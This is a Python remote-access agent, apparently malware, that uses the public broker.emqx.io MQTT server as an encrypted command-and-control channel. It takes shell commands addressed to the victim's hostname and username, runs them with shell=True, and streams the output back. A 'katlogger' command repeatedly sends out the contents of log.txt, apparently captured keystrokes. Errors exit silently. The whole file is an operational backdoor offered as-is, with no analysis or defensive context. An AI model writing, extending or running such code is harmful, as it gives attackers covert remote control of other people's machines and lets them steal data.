try:
    import os, time, json, base64, uuid, subprocess, socket, getpass, threading
    import paho.mqtt.client as mqtt
    from nacl.public import PrivateKey, PublicKey, Box
    from nacl.encoding import Base64Encoder
except ImportError as e:
    exit(1)
def hostname(): return socket.gethostname()
def username(): return getpass.getuser()

class Agent:
 try:
    def __init__(self, agent_id=None,
                 broker="broker.emqx.io", port=8083):  
        self.CWD = os.getcwd()
        self.AGENT_ID = agent_id or f"{hostname()}_{username()}"
        self.BROKER = broker
        self.PORT = port
        self.KEYFILE = "agent_private.key"
        self.ALLOW_RAW_EXEC = True


        self.sk = self.load_or_create_keyfile(self.KEYFILE)
        self.pk_b64 = self.sk.public_key.encode(encoder=Base64Encoder).decode()
        self.peers_pub = {}
        self.logging_active = False

    
        self.client = mqtt.Client(client_id=f"agent_{int(time.time())}", transport="websockets")
        self.client.ws_set_options(path="/mqtt")
        self.client.on_connect = self.on_connect
        self.client.on_message = self.on_message
        self.client.message_callback_add("meta/#", self.on_meta)

    def load_or_create_keyfile(self, path):
        if os.path.exists(path):
            return PrivateKey(open(path, "rb").read())
        sk = PrivateKey.generate()
        with open(path, "wb") as f:
            f.write(bytes(sk))
        return sk

    def publish_meta(self):
        self.client.publish(f"meta/{self.AGENT_ID}", json.dumps({"pub": self.pk_b64}), retain=True)

    def safe_send_encrypted(self, topic, target_pub_b64, payload_obj):
        box = Box(self.sk, PublicKey(target_pub_b64.encode(), encoder=Base64Encoder))
        ct = box.encrypt(json.dumps(payload_obj).encode())
        self.client.publish(topic, json.dumps({
            "from": self.AGENT_ID,
            "data": base64.b64encode(ct).decode()
        }))

    def on_connect(self, client, userdata, flags, rc):

        client.subscribe(f"cmd/{self.AGENT_ID}")
        client.subscribe("meta/#")
        self.publish_meta()

    def on_meta(self, client, userdata, msg):
        try:
            pid = msg.topic.split("/",1)[1]
            obj = json.loads(msg.payload.decode())
            pub = obj.get("pub")
            if pub:
                self.peers_pub[pid] = pub

        except Exception:
            pass

    def _send_output_lines(self, sender_pub, sender, cmd_id, stdout_text, stderr_text):
        for i, line in enumerate(stdout_text.splitlines()):
            self.safe_send_encrypted(f"out/{sender}", sender_pub,
                                     {"type":"cmd_output","id":cmd_id,"line":line,"stream":"stdout","seq":i})
        for i, line in enumerate(stderr_text.splitlines()):
            self.safe_send_encrypted(f"out/{sender}", sender_pub,
                                     {"type":"cmd_output","id":cmd_id,"line":line,"stream":"stderr","seq":i})

    def _katlogger_loop(self, sender, sender_pub, cmd_id):
        while self.logging_active:
            try:
                with open("log.txt", "r", encoding="utf-8") as f:
                    content = f.read()
                self.safe_send_encrypted(f"out/{sender}", sender_pub,
                                         {"type":"cmd_output","id":cmd_id,"line":content,"stream":"stdout","seq":0})
                time.sleep(0.5)
            except Exception as e:
                self.safe_send_encrypted(f"out/{sender}", sender_pub,
                                         {"type":"cmd_output","id":cmd_id,"line":str(e),"stream":"stderr","seq":0})
                break

    def on_message(self, c, u, msg):
        try:
            if msg.topic.startswith("meta/"): return
            payload = json.loads(msg.payload.decode())
            sender = payload.get("from")
            enc_data = payload.get("data")
            if sender not in self.peers_pub: return

            box = Box(self.sk, PublicKey(self.peers_pub[sender].encode(), encoder=Base64Encoder))
            data = json.loads(box.decrypt(base64.b64decode(enc_data)).decode())
            cmd_type = data.get("exec_type")
            cmd_id = data.get("id")
            
            if cmd_type == "raw" and self.ALLOW_RAW_EXEC:
                cmd_list = data.get("exec") or []
                cmd_str = " ".join(cmd_list)
                parts = cmd_str.strip().split()
                if parts and parts[0].lower() == "cd":
                    target = parts[1] if len(parts) > 1 else os.path.expanduser("~")
                    try:
                        os.chdir(target)
                        self.CWD = os.getcwd()
                        self.safe_send_encrypted(f"out/{sender}", self.peers_pub[sender],
                                                 {"type":"cwd","id":cmd_id,"cwd":self.CWD})
                        self.safe_send_encrypted(f"out/{sender}", self.peers_pub[sender],
                                                 {"type":"cmd_exit","id":cmd_id,"returncode":0,"duration":0})
                    except Exception as e:
                        self.safe_send_encrypted(f"out/{sender}", self.peers_pub[sender],
                                                 {"type":"cmd_output","id":cmd_id,"line":str(e),"stream":"stderr","seq":0})
                        self.safe_send_encrypted(f"out/{sender}", self.peers_pub[sender],
                                                 {"type":"cmd_exit","id":cmd_id,"returncode":1,"duration":0})
                    return

                proc = subprocess.Popen(cmd_str, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                        text=True, shell=True, cwd=self.CWD)
                stdout, stderr = proc.communicate()
                self.CWD = os.getcwd()
                self.safe_send_encrypted(f"out/{sender}", self.peers_pub[sender],
                                         {"type":"cwd","id":cmd_id,"cwd":self.CWD})
                self._send_output_lines(self.peers_pub[sender], sender, cmd_id, stdout, stderr)
                self.safe_send_encrypted(f"out/{sender}", self.peers_pub[sender],
                                         {"type":"cmd_exit","id":cmd_id,"returncode":proc.returncode,"duration":0})
            if data.get("type") == "control":
                command = data.get("command")
                if command == "katlogger":
                    self.logging_active = True
                    threading.Thread(target=self._katlogger_loop, args=(sender, self.peers_pub[sender], cmd_id)).start()
                elif command == "stop katlogger":
                    self.logging_active = False

        except Exception as e:
            exit(1)

    def run(self):
        self.client.connect(self.BROKER, self.PORT, 60)
        self.client.loop_start()
        try:
            while True: time.sleep(1)
        except KeyboardInterrupt:
            self.client.loop_stop()
            self.client.disconnect()
 except Exception as e:
     exit(1)
if __name__ == "__main__":
    Agent().run()
    